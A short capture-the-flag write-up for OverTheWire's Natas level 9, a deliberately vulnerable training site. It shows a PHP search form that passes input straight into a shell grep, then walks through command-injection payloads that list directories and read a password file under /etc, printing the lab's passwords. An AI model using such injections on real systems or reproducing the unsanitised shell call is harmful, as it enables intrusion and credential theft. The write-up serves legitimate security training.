# Natas Level 9
The ***URL*** to which you need to connect is *http://natas9.natas.labs.overthewire.org*. The ***username*** is *natas9* and the ***password*** is *W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl*. 

Lets check the [viewsource](http://natas9.natas.labs.overthewire.org/index-source.html) link.
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
By analysing the php script we see that the filter is not being sanitize. Therefore, we can inject additional commands like "ls" 
##### Mark 

>When I enter "*" in the input I receive the index-source.html if you know why please let me know.

```
;pwd
# /var/www/natas/natas9
; find / -name natas9 -type f;
# /etc/natas_webpass/natas9
;cat /etc/natas_webpass/natas9;
```

```
Password : nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```
